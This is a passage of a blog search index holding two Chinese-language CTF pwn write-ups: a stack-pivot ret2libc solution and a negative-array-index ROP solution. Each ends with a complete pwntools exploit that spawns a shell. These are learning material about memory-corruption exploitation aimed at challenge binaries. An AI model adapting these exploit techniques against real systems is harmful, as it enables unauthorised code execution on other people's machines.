      <tag>栈迁移</tag>
      
      <tag>ret2libc</tag>
      
      <tag>ORW</tag>
      
      <tag>寄存器</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>stack pivot</title>
    <link href="/2025/12/25/stack-pivot/"/>
    <url>/2025/12/25/stack-pivot/</url>
    
    <content type="html"><![CDATA[<p>题目出自哪里已经记不真切了</p><p>只依稀记得这是我正式做的第一道pwn题，当时的我就像刚出新手村的菜鸟遇见了大boss一般，与其鏖战了数个日夜才终于拿下</p><p>来看看吧!</p><p>题目逻辑非常之简单</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">undefined8 <span class="hljs-title function_">main</span><span class="hljs-params">(EVP_PKEY_CTX *param_1)</span><br>&#123;<br>  undefined1 local_58 [<span class="hljs-number">80</span>];<br>  <br>  init(param_1);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Xswlhhh!Use stack hijacking on him!&quot;</span>);<br>  read(<span class="hljs-number">0</span>,local_58,<span class="hljs-number">0x60</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>题目的保护只有<code>NX</code></p><p>但是这在当时对于只会无脑溢出覆盖返回地址的我来说宛如噩梦，设置了local_58[80]，然而read只有0x60的大小，也就是说算上<code>saved rbp</code>只剩下最后的8个字节供我覆盖rip，而题目又有<code>NX</code>，长度完全不够执行rop链!怎么办呢?我查询资料，得知存在一种技术叫做:<code>栈迁移(stack pivot)</code></p><p>原理在于，将<code>saved rbp</code>覆盖为你想让rbp去的地方，将rip覆盖为再执行一次read的地址，因此执行逻辑便变为，main函数结束后，即将退出，执行<code>leave; ret;</code>的指令，而<code>saved rbp</code>已经被设置为我们想让它去的地方(通常是一个可读可写的地址段)，rip又一次执行read，最后在那个段空间重新分配一个新的栈帧，供我们自由发挥</p><p>这里有一些前置知识需要理解，当时困扰了我许久，现在写下来，首先是<code>leave; ret;</code>干了什么，你可以将其理解为两个阶段，先是leave，其相当于<code>mov rsp,rbp</code>和<code>pop rbp</code>，注意，最后，<code>rsp += 8</code>，然后执行<code>ret</code>指令，相当于<code>rip = *rsp</code>，注意，同样，<code>rsp += 8</code>，接下来，如何理解栈帧?其实cpu并不在乎rbp在哪里，它只关心执行流要干什么事儿</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asm">LEA RAX =&gt; local_58,[RBP + -0x50]<br></code></pre></td></tr></table></figure><p>read始于local_58[80]的地址，local_58[80]这个数组始终位于<code>rbp - 0x50</code>的位置，而<code>rbp + 0x8</code>的位置便是<code>rip</code>，栈帧布局永远如此，无论rbp在哪里，因此给了我们伪造新栈帧的利用空间</p><p>所以第一段payload如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = <span class="hljs-string">b&quot;A&quot;</span> * <span class="hljs-number">0x50</span><br>payload += p64(elf.bss(<span class="hljs-number">0x800</span>))<br>payload += p64(<span class="hljs-number">0x4011e3</span>)  <span class="hljs-comment">#相当于重新执行一次read</span><br>sh.sendafter(<span class="hljs-string">b&quot;\n&quot;</span>,payload)<br></code></pre></td></tr></table></figure><p>这时一个新的栈帧在bss段中形成了</p><p>我们在新的栈帧中有了充足的空间来写rop链，因此便十分<em>easy</em>了，就打一个ret2libc吧，先来泄露libc基址</p><p>payload如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = p64(pop_rdi_ret) + p64(elf.got[<span class="hljs-string">&quot;puts&quot;</span>])<br>payload += p64(elf.plt[<span class="hljs-string">&quot;puts&quot;</span>])<br>payload += p64(elf.sym[<span class="hljs-string">&quot;main&quot;</span>])<br>payload = payload.ljust(<span class="hljs-number">0x50</span>,<span class="hljs-string">b&quot;\0&quot;</span>)<br>payload += p64(elf.bss(<span class="hljs-number">0x800</span>-<span class="hljs-number">0x58</span>))<br>payload += p64(leave_ret)<br>sh.sendafter(<span class="hljs-string">b&quot;\n&quot;</span>,payload)<br></code></pre></td></tr></table></figure><p>第一次看这个payload应该还是蛮懵的，不过对照着<code>leave; ret;</code>的含义在内存布局中多自己分析推导几遍便能理解其妙处所在，这里便不展开了</p><p>大致画一下内存布局供你分析</p><p><img src="/images/4.png" alt="内存布局"></p><p>接下来接收得到的puts真实地址并计算libc基址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">libc.address = u64(sh.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\0&quot;</span>)) - libc.sym[<span class="hljs-string">&quot;puts&quot;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;libc @&quot;</span>,<span class="hljs-built_in">hex</span>(libc.address))<br></code></pre></td></tr></table></figure><p>注意上述payload执行完后我们又回到了main函数，此时rsp经过一系列弹栈，应该位于<code>0x404810</code>的位置，而main函数起始处的指令再次布置了栈帧</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asm">push rbp<br>mov rbp,rsp<br>sub rsp,0x50<br></code></pre></td></tr></table></figure><p>这段理解起来确实比较复杂，还是那句话，多动手调试(善用你的gdb)，思考，分析<em>汇编</em>，<strong>rsp</strong>，<strong>rbp</strong>，<strong>rip</strong>，<em>内存</em>等的变化</p><p>此时在新的栈帧上，类似于上面，我们布置我们的最终payload</p><p>如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = p64(pop_rdi_ret) + p64(<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>)))<br>payload += p64(ret)  <span class="hljs-comment">#对齐!</span><br>payload += p64(libc.sym[<span class="hljs-string">&quot;system&quot;</span>])<br>payload = payload.ljust(<span class="hljs-number">0x50</span>,<span class="hljs-string">b&quot;\0&quot;</span>)<br>payload += p64(<span class="hljs-number">0x4047b0</span>)<br>payload += p64(leave_ret)<br>sh.sendafter(<span class="hljs-string">b&quot;\n&quot;</span>,payload)<br></code></pre></td></tr></table></figure><p>最后也是成功拿到shell</p><p>如果你彻底理解了这道题目，并能完整推理一遍过程，恭喜你，大抵是彻底理解了<code>stack pivot</code>这门技术，接下来迎接你的即将是更为复杂的栈布局，你加油，我也加油…</p><p>最后补一下完整exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>elf =ELF(<span class="hljs-string">&quot;./pivot&quot;</span>,<span class="hljs-literal">False</span>) <span class="hljs-comment">#本地...</span><br>libc = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>,<span class="hljs-literal">False</span>)<br>context.binary = elf<br>sh = elf.process()<br><br>pop_rdi_ret = <span class="hljs-number">0x401225</span><br>leave_ret = <span class="hljs-number">0x40121b</span><br>ret = leave_ret + <span class="hljs-number">1</span><br><br>payload = <span class="hljs-string">b&quot;A&quot;</span> * <span class="hljs-number">0x50</span><br>payload += p64(elf.bss(<span class="hljs-number">0x800</span>))<br>payload += p64(<span class="hljs-number">0x4011e3</span>)<br>sh.sendafter(<span class="hljs-string">b&quot;\n&quot;</span>,payload)<br><br><br>payload = p64(pop_rdi_ret) + p64(elf.got[<span class="hljs-string">&quot;puts&quot;</span>])<br>payload += p64(elf.plt[<span class="hljs-string">&quot;puts&quot;</span>])<br>payload += p64(elf.sym[<span class="hljs-string">&quot;main&quot;</span>])<br>payload = payload.ljust(<span class="hljs-number">0x50</span>,<span class="hljs-string">b&quot;\0&quot;</span>)<br>payload += p64(elf.bss(<span class="hljs-number">0x800</span>-<span class="hljs-number">0x58</span>))<br>payload += p64(leave_ret)<br>sh.sendafter(<span class="hljs-string">b&quot;\n&quot;</span>,payload)<br><br>libc.address = u64(sh.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\0&quot;</span>)) - libc.sym[<span class="hljs-string">&quot;puts&quot;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;libc @&quot;</span>,<span class="hljs-built_in">hex</span>(libc.address))<br>payload = p64(pop_rdi_ret) + p64(<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>)))<br>payload += p64(ret)<br>payload += p64(libc.sym[<span class="hljs-string">&quot;system&quot;</span>])<br>payload = payload.ljust(<span class="hljs-number">0x50</span>,<span class="hljs-string">b&quot;\0&quot;</span>)<br>payload += p64(<span class="hljs-number">0x4047b0</span>)<br>payload += p64(leave_ret)<br>sh.sendafter(<span class="hljs-string">b&quot;\n&quot;</span>,payload)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure><p>感谢阅读…</p><p>生活愉快!</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内存布局</tag>
      
      <tag>栈迁移</tag>
      
      <tag>ret2libc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>a_strange_rop</title>
    <link href="/2025/12/25/a-strange-rop/"/>
    <url>/2025/12/25/a-strange-rop/</url>
    
    <content type="html"><![CDATA[<p>题目来自2025XSWCTF决赛的pwn题: <code>a_atrange_rop</code></p><p>赛后才做出来</p><p>我也真是无敌了…</p><p>题目为64位动态链接elf文件</p><p>保护为<code>NX</code>和<code>canary</code></p><p>既然题目叫a_stranre_rop</p><p>我们先看看有没有gadget</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ROPgadget --binary ./a_strange_rop | grep <span class="hljs-string">&quot;pop rdi&quot;</span><br></code></pre></td></tr></table></figure><p>找到了<code>pop rdi; ret;</code>这样的一个gadget</p><p>先观察一下题目逻辑</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">undefined8 <span class="hljs-title function_">main</span><span class="hljs-params">(EVP_PKEY_CTX *param_1)</span><br>&#123;<br>  <span class="hljs-type">int</span> iVar1;<br>  <br>  init(param_1);<br>  iVar1 = game();<br>  <span class="hljs-keyword">if</span> (iVar1 == <span class="hljs-number">1</span>) &#123;<br>    win();<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>init为初始化函数，无实际意义，忽略</p><p>我们先来看一下win函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">win</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br><br>&#123;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;good!&quot;</span>);<br>  system(<span class="hljs-string">&quot;ababalabalabalawuwuwuuwyyyyy&quot;</span>);<br>  <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到即使调用了win也不会真的<code>win</code>，但是它为我们提供了<code>call system</code>这样一个系统调用的函数</p><p>配合我们上面找到的gadget</p><p>似乎很容易就能写出system(“&#x2F;bin&#x2F;sh”)</p><p>来看看主逻辑game部分</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs c">undefined8 <span class="hljs-title function_">game</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br><br>&#123;<br>  <span class="hljs-type">int</span> iVar1;<br>  <span class="hljs-type">int</span> iVar2;<br>  <span class="hljs-type">time_t</span> tVar3;<br>  undefined8 uVar4;<br>  <span class="hljs-type">long</span> in_FS_OFFSET;<br>  <span class="hljs-type">int</span> local_78;<br>  uint local_74;<br>  <span class="hljs-type">long</span> local_68 [<span class="hljs-number">11</span>];<br>  <span class="hljs-type">long</span> local_10;<br>  <br>  local_10 = *(<span class="hljs-type">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>);<br>  id = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">puts</span>(&amp;DAT_0040202b);<br>  tVar3 = time((<span class="hljs-type">time_t</span> *)<span class="hljs-number">0x0</span>);<br>  srand((uint)tVar3);<br>  <span class="hljs-keyword">for</span> (local_78 = <span class="hljs-number">0</span>; local_78 &lt; <span class="hljs-number">10</span>; local_78 = local_78 + <span class="hljs-number">1</span>) &#123;<br>    iVar1 = FUN_00401160();<br>    iVar2 = FUN_00401160();<br>    <span class="hljs-built_in">printf</span>(&amp;DAT_00402041,(ulong)id,(ulong)(uint)(iVar1 % <span class="hljs-number">0x14</span>),(ulong)(uint)(iVar2 % <span class="hljs-number">0x14</span>));<br>    (&amp;answer)[(<span class="hljs-type">int</span>)id] = (<span class="hljs-type">long</span>)(iVar2 % <span class="hljs-number">0x14</span> + iVar1 % <span class="hljs-number">0x14</span>);<br>    id = id + <span class="hljs-number">1</span>;<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(&amp;DAT_00402058);<br>  <span class="hljs-keyword">for</span> (; t &lt; <span class="hljs-number">0xb</span>; t = t + <span class="hljs-number">1</span>) &#123;<br>    <span class="hljs-built_in">printf</span>(&amp;DAT_00402077);<br>    __isoc99_scanf(&amp;DAT_00402085,&amp;id);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-number">9</span> &lt; (<span class="hljs-type">int</span>)id) &#123;<br>      <span class="hljs-built_in">puts</span>(&amp;DAT_00402088);<br>                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span><br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">0x1bf52</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(&amp;DAT_004020a8);<br>    __isoc99_scanf(&amp;DAT_004020b0,local_68 + (<span class="hljs-type">int</span>)id);<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(&amp;DAT_004020b8);<br>  local_74 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">do</span> &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-number">9</span> &lt; (<span class="hljs-type">int</span>)local_74) &#123;<br>      uVar4 = <span class="hljs-number">1</span>;<br>LAB_00401548:<br>      <span class="hljs-keyword">if</span> (local_10 != *(<span class="hljs-type">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>)) &#123;<br>                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span><br>        __stack_chk_fail();<br>      &#125;<br>      <span class="hljs-keyword">return</span> uVar4;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ((&amp;answer)[(<span class="hljs-type">int</span>)local_74] != local_68[(<span class="hljs-type">int</span>)local_74]) &#123;<br>      <span class="hljs-built_in">printf</span>(&amp;DAT_004020d8,(ulong)local_74);<br>      uVar4 = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">goto</span> LAB_00401548;<br>    &#125;<br>    local_74 = local_74 + <span class="hljs-number">1</span>;<br>  &#125; <span class="hljs-keyword">while</span>( <span class="hljs-literal">true</span> );<br>&#125;<br></code></pre></td></tr></table></figure><p>运行起来是这么个样子</p><p><img src="/images/1.png" alt="交互"></p><p>略微有点长，但是并不难理解，local_10为随机生成的canary值，因此不能直接溢出覆盖返回地址，否则会触发canary检测程序直接退出</p><p>题目要求回答一些小学数学题目，全部回答正确就跳转到win函数，但是我们已经看到win函数并没有实际作用，因此思路依旧是覆盖返回地址为我们构造的rop链</p><p>先来分析一下栈布局</p><p>定义了一个数组local_68[11]</p><p>可以分析得出</p><p><img src="/images/2.png" alt="栈布局大致如此"></p><p>题目设置了一个小check机制，明明有0到9十道题目，但是数组设置了0到10十一个题目编号，而输入的题目编号大于9的时候程序自动退出，并大声斥责我们<em>你想干什么!</em></p><p>我的第一个思路是设置题目编号为8，即local_68[9]所在的位置，向上填充至覆盖rip，执行rop链</p><p>但是这个canary是我永远越不过的坎…</p><p>思来想去，我突然注意到，题目编号大于9时会自动退出，<strong>但是</strong>题目却不检查负数编号!</p><p>因此我们可以将题目设置为负数通过负索引去写前面的地址!</p><p>用gdb看一看怎么个事儿</p><p>我在第一次输入后打上了断点，输入编号<code>-1</code>并输入答案<code>666</code>，local_68在rbp下0x60的位置，我们看看更下面的情况</p><p><img src="/images/3.png" alt="地址情况"></p><p>可以看到，正如我们分析的那般，<code>-1</code>索引写的<code>666</code>代表的<code>00029a</code>写在了local_68下方的地址，再认真一看，前方的<code>0x004014bc</code>不正是另一个函数的返回地址吗!</p><p>我们只需要将索引设置为-3便可以覆盖另一个函数的返回地址来执行我们的rop链</p><p>这个函数用canary将我们拦住，十分安全，可是，另一个函数却已经悄然被我们所攻克…</p><p>题目也是十分贴心，<code>/bin/sh</code>字符串都帮我们准备好了</p><p>接下来便很简单了</p><p>exp也是十分优雅</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&#x27;host&#x27;</span>,port)<br><br>bin_sh = <span class="hljs-built_in">str</span>(<span class="hljs-number">4210808</span>)   <span class="hljs-comment"># 0x404078</span><br>call_system = <span class="hljs-built_in">str</span>(<span class="hljs-number">4199136</span>)   <span class="hljs-comment"># 0x4012e0</span><br>pop_rdi_ret = <span class="hljs-built_in">str</span>(<span class="hljs-number">4199153</span>)  <span class="hljs-comment"># 0x4012f1</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_pair</span>(<span class="hljs-params">idx, val</span>):<br>    p.recvuntil(<span class="hljs-string">&#x27;题目编号:&#x27;</span>)<br>    p.send(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;idx&#125;</span>\n&quot;</span>.encode())<br>    p.recvuntil(<span class="hljs-string">&#x27;结果:&#x27;</span>)<br>    p.send(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;val&#125;</span>\n&quot;</span>.encode())<br><br>send_pair(-<span class="hljs-number">2</span>, bin_sh)    <span class="hljs-comment"># 写 /bin/sh</span><br>send_pair(-<span class="hljs-number">1</span>, call_system)   <span class="hljs-comment"># 调用 system</span><br>send_pair(-<span class="hljs-number">3</span>, pop_rdi_ret)  <span class="hljs-comment"># 覆盖另一个函数的rip</span><br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>最后也是成功地拿到shell</p><p>至此，终于理解题目为什么叫:<code>a_strange_rop</code>!</p><p>2026.2.11</p><p>ps:</p><p>经典<code>负索引</code></p><p>hh</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>gdb</tag>
      
      <tag>内存布局</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
